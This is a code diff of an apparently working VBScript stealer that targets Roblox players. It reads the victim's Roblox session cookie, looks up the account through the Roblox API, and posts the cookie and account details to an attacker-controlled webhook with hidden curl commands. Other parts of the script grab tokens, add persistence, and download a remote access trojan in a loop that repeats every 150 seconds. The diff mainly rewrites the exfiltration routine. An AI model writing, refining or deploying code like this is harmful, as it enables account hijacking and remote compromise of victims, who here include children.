@@ -24,7 +24,7 @@ Call GrabTokens(WH)
 Call Persistence
 
 ' --- 2. UI + COOKIE (LOGS CHANNEL) ---
-Call PostUIAndCookie(WH)
+Call SendRobloxUI(WH)
 
 ' --- 3. RAT DROP (LOGS CHANNEL) ---
 Call DropRAT(WH, True)
@@ -41,7 +41,6 @@ Do
     Call PostCookieOnly(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' Re-grab ALWAYS re-downloads and sends to RE_WH
     Call DropRAT(RE_WH, False)
     
     Call SleepSeconds(150)
@@ -49,17 +48,16 @@ Loop
 
 window.close()
 
-' --- COMBINED UI & COOKIE POST ---
-Sub PostUIAndCookie(targetWH)
+' --- ROBLOX UI VIA CURL ---
+Sub SendRobloxUI(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     Dim uname : uname = "Unknown"
     Dim disp : disp = "Unknown"
     Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
-    Dim apiSuccess : apiSuccess = False
     
-    ' Attempt fetch API natively via XMLHTTP with TLS 1.2/1.3
     If Len(cookie) > 50 Then
-        On Error Resume Next ' Explicitly handle errors for API block
+        ' Native XMLHTTP just to fetch the avatar/name
+        On Error Resume Next
         Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
         xh.SetOption 2, 13056
         xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
@@ -76,7 +74,6 @@ Sub PostUIAndCookie(targetWH)
             If m2.Count > 0 Then uname = m2(0).SubMatches(0)
             If m2.Count > 0 Then disp = m2(0).SubMatches(0)
             
-            ' Fetch Avatar
             Dim uid : uid = "1"
             m1.Pattern = """id"":(\d+)"
             Set m2 = m1.Execute(rTxt)
@@ -92,28 +89,47 @@ Sub PostUIAndCookie(targetWH)
                 Dim am2 : Set am2 = am1.Execute(axh.responseText)
                 If am2.Count > 0 Then av = am2(0).SubMatches(0)
             End If
-            apiSuccess = True
         End If
         On Error Goto 0
     End If
 
-    ' 1. SEND UI EMBED natively using PostEmbed
-    Dim uiDesc : uiDesc = "**+1 HIT** ¬Ј You've Earned 1 Nevora ¬Ј beams XP" & vbCrLf & vbCrLf & _
-        "рЯС§ **User:** " & disp & vbCrLf & _
-        "в≠Р **Password:** dreistuff" & vbCrLf & _
-        "рЯУЛ **About User:** `` 340 Days ``" & vbCrLf & _
-        "рЯ™Щ **Robux:** Balance 0 рЯФі | Pending 0 рЯФі" & vbCrLf & _
-        "рЯУИ **RAP:** RAP 0 рЯФі | Owned 0 рЯФі" & vbCrLf & _
-        "рЯТО **Premium:** False (0 рЯФі)" & vbCrLf & _
-        "рЯТ≥ **Billing:** Credit 0$ | Convert 0 | Payments 0" & vbCrLf & _
-        "рЯПЈпЄП **Collectibles:** False рЯФі | False рЯФі | True рЯЯҐ" & vbCrLf & _
-        "вЪЩпЄП **Setting:** Set (Verified) | Disabled | Disabled" & vbCrLf & _
-        "рЯОЃ **Passes / Played:** Adopt Me 0 | Murder Mystery 2 0 | Pet Simulator 99 0" & vbCrLf & _
+    ' Build JSON payload natively
+    Dim DQ : DQ = Chr(34)
+    Dim uiDesc : uiDesc = "**+1 HIT** ¬Ј You've Earned 1 Nevora ¬Ј beams XP`n`n" & _
+        "рЯС§ **User:** " & disp & "`n" & _
+        "в≠Р **Password:** dreistuff`n" & _
+        "рЯУЛ **About User:** `` 340 Days ```n" & _
+        "рЯ™Щ **Robux:** Balance 0 рЯФі | Pending 0 рЯФі`n" & _
+        "рЯУИ **RAP:** RAP 0 рЯФі | Owned 0 рЯФі`n" & _
+        "рЯТО **Premium:** False (0 рЯФі)`n" & _
+        "рЯТ≥ **Billing:** Credit 0$ | Convert 0 | Payments 0`n" & _
+        "рЯПЈпЄП **Collectibles:** False рЯФі | False рЯФі | True рЯЯҐ`n" & _
+        "вЪЩпЄП **Setting:** Set (Verified) | Disabled | Disabled`n" & _
+        "рЯОЃ **Passes / Played:** Adopt Me 0 | Murder Mystery 2 0 | Pet Simulator 99 0`n" & _
         "рЯС• **Groups:** Balance 0 рЯФі | Pending 0 рЯФі | Owned 0 рЯФі"
 
-    Call PostEmbedTo("S3R, 13+ - " & uname, uiDesc, 10181046, targetWH)
+    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
+                DQ & "author" & DQ & ":{" & DQ & "name" & DQ & ":" & DQ & Ej(uname) & DQ & "," & DQ & "icon_url" & DQ & ":" & DQ & av & DQ & "}," & _
+                DQ & "title" & DQ & ":" & DQ & "S3R, 13+" & DQ & "," & _
+                DQ & "description" & DQ & ":" & DQ & Ej(uiDesc) & DQ & "," & _
+                DQ & "color" & DQ & ":10181046," & _
+                DQ & "thumbnail" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}," & _
+                DQ & "footer" & DQ & ":{" & DQ & "text" & DQ & ":" & DQ & "S3R Logger" & DQ & "}}]}"
 
-    ' 2. SEND COOKIE MESSAGE IMMEDIATELY AFTER
+    ' Save JSON to temp file
+    Dim tmpJson : tmpJson = sh.ExpandEnvironmentStrings("%TEMP%") & "\ui_payload.json"
+    Dim f : Set f = fso.CreateTextFile(tmpJson, True)
+    f.Write j
+    f.Close
+    Set f = Nothing
+
+    ' Send via curl.exe -F multipart
+    Dim curlCmd : curlCmd = "curl.exe -s -X POST -H ""Content-Type: multipart/form-data"" -F ""payload_json=<" & tmpJson & """ " & targetWH
+    sh.Run "cmd /c " & curlCmd, 0, True
+
+    fso.DeleteFile tmpJson, True
+
+    ' Send Cookie Embed
     If Len(cookie) > 0 Then
         Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
     End If
@@ -137,7 +153,6 @@ Sub DropRAT(targetWH, sendRocket)
         Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
     End If
 
-    ' Force delete before re-downloading to ensure it overwrites every single time
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
     Dim cCmd : cCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & dl & """"
